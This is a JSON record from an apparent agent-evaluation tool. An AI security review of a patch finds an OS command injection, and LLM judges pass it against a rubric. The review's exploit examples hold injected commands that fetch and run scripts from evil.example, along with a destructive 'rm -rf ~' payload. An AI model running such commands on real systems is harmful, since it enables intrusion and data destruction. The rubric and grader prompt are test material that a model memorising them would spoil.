@@ -1,0 +1,71 @@
+{
+  "caseId": "obfuscated-cmdi",
+  "rep": 2,
+  "prompt": "Review this diff for security issues and report your findings.",
+  "files": [
+    "diff-obfuscated-cmdi.patch"
+  ],
+  "output": "## Security Review: `diff-obfuscated-cmdi.patch`\n\n### Finding: OS Command Injection via unsanitized `os.system()` call\n\n**File:** `src/media/thumbnail.py` (line 14)\n\n**What changed:** The patch replaces a safe `subprocess.run([...])` call (which passes arguments as a list, bypassing the shell) with `os.system(\" \".join(parts))`, which concatenates attacker-controlled strings into a single string and executes it through `/bin/sh`.\n\n**Root cause:** `infile` and `size` are taken directly from user-controlled query parameters (`request.GET.get(\"src\", ...)` and `request.GET.get(\"size\", ...)`) with no validation, sanitization, or shell-escaping, then joined with spaces into a shell command string.\n\n**Exploit scenario:** A request such as:\n```\nGET /thumbnail?src=input.png;curl+http://evil.example/x.sh|sh;&size=100x100\n```\nor more simply, using shell metacharacters in `src`:\n```\nsrc=input.png; rm -rf ~ #\n```\nor command substitution:\n```\nsrc=$(curl -s http://evil.example/payload.sh | sh)\n```\nwill be interpolated verbatim into the shell command executed by `os.system`, giving the attacker arbitrary command execution with the privileges of the web process (CWE-78 / OWASP A03:2021 – Injection).\n\n**Notable red herring:** `shlex` is imported but never actually used to quote the arguments — it appears to signal \"safe quoting\" was intended but the actual `shlex.quote()` (or `shlex.join()`) call was omitted, while the shell-invoking `os.system()` was introduced. This is the classic obfuscated-command-injection pattern: looks like a refactor, but silently drops the argv-list safety of `subprocess.run` for shell string execution.\n\n**Severity:** Critical — unauthenticated, remote, arbitrary command execution.\n\n**Fix:** Revert to the list-based, non-shell invocation, and additionally validate inputs (e.g., restrict `size` to a strict `^\\d+x\\d+$` pattern and validate/whitelist `infile` against path traversal):\n\n```python\nimport re\nimport subprocess\n\nSIZE_RE = re.compile(r\"^\\d{1,5}x\\d{1,5}$\")\n\ndef make_thumbnail(request):\n    infile = request.GET.get(\"src\", \"input.png\")\n    size = request.GET.get(\"size\", \"100x100\")\n    outfile = \"thumb.png\"\n\n    if not SIZE_RE.match(size):\n        raise ValueError(\"invalid size\")\n    # also validate/sanitize infile (e.g. resolve and confirm it's within an allowed directory,\n    # reject absolute paths / \"..' components) to prevent path traversal / arbitrary file read\n\n    subprocess.run([\"convert\", infile, \"-resize\", size, outfile], check=True)\n    return {\"thumb\": outfile}\n```\n\nNever use `os.system`/`shell=True` with any user-influenced input; always pass argument lists to `subprocess.run`/`Popen`.",
+  "exitCode": 0,
+  "timedOut": false,
+  "infraRetries": 0,
+  "startedAt": "2026-07-19T00:18:18.503Z",
+  "durationMs": 29585,
+  "checks": [
+    {
+      "matcher": "llm_rubric",
+      "passed": true,
+      "details": {
+        "verdict": "pass",
+        "judgments": [
+          {
+            "verdict": "pass",
+            "reasoning": "The agent correctly identified that user-controlled `src` and `size` parameters from request.GET are joined into a single string and passed to `os.system()`, correctly explaining that this bypasses the argv-list safety of the previous `subprocess.run([...])` call and enables arbitrary shell command injection via shell metacharacters. It provided concrete exploit examples and a correct fix (reverting to list-based subprocess with strict input validation), which satisfies the rubric's core requirement of identifying the real command/shell injection vulnerability.",
+            "raw": "VERDICT: PASS\nREASON: The agent correctly identified that user-controlled `src` and `size` parameters from request.GET are joined into a single string and passed to `os.system()`, correctly explaining that this bypasses the argv-list safety of the previous `subprocess.run([...])` call and enables arbitrary shell command injection via shell metacharacters. It provided concrete exploit examples and a correct fix (reverting to list-based subprocess with strict input validation), which satisfies the rubric's core requirement of identifying the real command/shell injection vulnerability."
+          },
+          {
+            "verdict": "pass",
+            "reasoning": "The agent correctly identified the core vulnerability — that user-controlled `size`/`src` parameters are joined into a shell string via `os.system(\" \".join(parts))`, replacing the previously safe argument-vector `subprocess.run([...])` call — and explained the exploit scenario, root cause, and fix, which matches the rubric's required finding of OS command/shell injection.",
+            "raw": "VERDICT: PASS\nREASON: The agent correctly identified the core vulnerability — that user-controlled `size`/`src` parameters are joined into a shell string via `os.system(\" \".join(parts))`, replacing the previously safe argument-vector `subprocess.run([...])` call — and explained the exploit scenario, root cause, and fix, which matches the rubric's required finding of OS command/shell injection."
+          }
+        ],
+        "model": "claude-sonnet-5",
+        "transport": "claude-agent",
+        "prompt": "You are an impartial evaluator inside an automated agent-testing tool. Judge ONLY whether the agent's output satisfies the rubric — not style, not effort, not whether you would have answered differently.\n\n<rubric>\nThe diff introduces an OS command injection vulnerability: user-controlled `size`/`src` from request.GET are collected into a `parts` list that is then joined into a single shell string with `' '.join(parts)` and passed to `os.system(...)`, allowing arbitrary shell command execution (e.g. size='100x100; rm -rf ~'). The previous code used a safe `subprocess.run([...])` argument vector. PASS only if the review identifies this as a real command/shell injection vulnerability caused by user input reaching `os.system`; FAIL if it misses it, concludes the code is safe (e.g. mistakes `parts` for a safe argument vector), or only comments on style or the unused `shlex` import.\n</rubric>\n\n<task_given_to_agent>\nReview this diff for security issues and report your findings.\n</task_given_to_agent>\n\n<agent_output>\n## Security Review: `diff-obfuscated-cmdi.patch`\n\n### Finding: OS Command Injection via unsanitized `os.system()` call\n\n**File:** `src/media/thumbnail.py` (line 14)\n\n**What changed:** The patch replaces a safe `subprocess.run([...])` call (which passes arguments as a list, bypassing the shell) with `os.system(\" \".join(parts))`, which concatenates attacker-controlled strings into a single string and executes it through `/bin/sh`.\n\n**Root cause:** `infile` and `size` are taken directly from user-controlled query parameters (`request.GET.get(\"src\", ...)` and `request.GET.get(\"size\", ...)`) with no validation, sanitization, or shell-escaping, then joined with spaces into a shell command string.\n\n**Exploit scenario:** A request such as:\n```\nGET /thumbnail?src=input.png;curl+http://evil.example/x.sh|sh;&size=100x100\n```\nor more simply, using shell metacharacters in `src`:\n```\nsrc=input.png; rm -rf ~ #\n```\nor command substitution:\n```\nsrc=$(curl -s http://evil.example/payload.sh | sh)\n```\nwill be interpolated verbatim into the shell command executed by `os.system`, giving the attacker arbitrary command execution with the privileges of the web process (CWE-78 / OWASP A03:2021 – Injection).\n\n**Notable red herring:** `shlex` is imported but never actually used to quote the arguments — it appears to signal \"safe quoting\" was intended but the actual `shlex.quote()` (or `shlex.join()`) call was omitted, while the shell-invoking `os.system()` was introduced. This is the classic obfuscated-command-injection pattern: looks like a refactor, but silently drops the argv-list safety of `subprocess.run` for shell string execution.\n\n**Severity:** Critical — unauthenticated, remote, arbitrary command execution.\n\n**Fix:** Revert to the list-based, non-shell invocation, and additionally validate inputs (e.g., restrict `size` to a strict `^\\d+x\\d+$` pattern and validate/whitelist `infile` against path traversal):\n\n```python\nimport re\nimport subprocess\n\nSIZE_RE = re.compile(r\"^\\d{1,5}x\\d{1,5}$\")\n\ndef make_thumbnail(request):\n    infile = request.GET.get(\"src\", \"input.png\")\n    size = request.GET.get(\"size\", \"100x100\")\n    outfile = \"thumb.png\"\n\n    if not SIZE_RE.match(size):\n        raise ValueError(\"invalid size\")\n    # also validate/sanitize infile (e.g. resolve and confirm it's within an allowed directory,\n    # reject absolute paths / \"..' components) to prevent path traversal / arbitrary file read\n\n    subprocess.run([\"convert\", infile, \"-resize\", size, outfile], check=True)\n    return {\"thumb\": outfile}\n```\n\nNever use `os.system`/`shell=True` with any user-influenced input; always pass argument lists to `subprocess.run`/`Popen`.\n</agent_output>\n\nAnswer in EXACTLY this format (first line must be the verdict):\nVERDICT: PASS\nREASON: <one short paragraph>\n\nor\n\nVERDICT: FAIL\nREASON: <one short paragraph>"
+      }
+    }
+  ],
+  "usage": {
+    "input_tokens": 6,
+    "output_tokens": 1379,
+    "model": "claude-sonnet-5"
+  },
+  "transcript": {
+    "subtype": "success",
+    "num_turns": 3,
+    "total_cost_usd": 0.0763688,
+    "modelUsage": {
+      "claude-sonnet-5": {
+        "inputTokens": 6,
+        "outputTokens": 1379,
+        "cacheReadInputTokens": 81156,
+        "cacheCreationInputTokens": 5118,
+        "webSearchRequests": 0,
+        "costUSD": 0.0757578,
+        "contextWindow": 1000000,
+        "maxOutputTokens": 64000
+      },
+      "claude-haiku-4-5-20251001": {
+        "inputTokens": 546,
+        "outputTokens": 13,
+        "cacheReadInputTokens": 0,
+        "cacheCreationInputTokens": 0,
+        "webSearchRequests": 0,
+        "costUSD": 0.000611,
+        "contextWindow": 200000,
+        "maxOutputTokens": 32000
+      }
+    },
+    "_note": "SDK message stream removed for privacy; summary retained"
+  }
+}
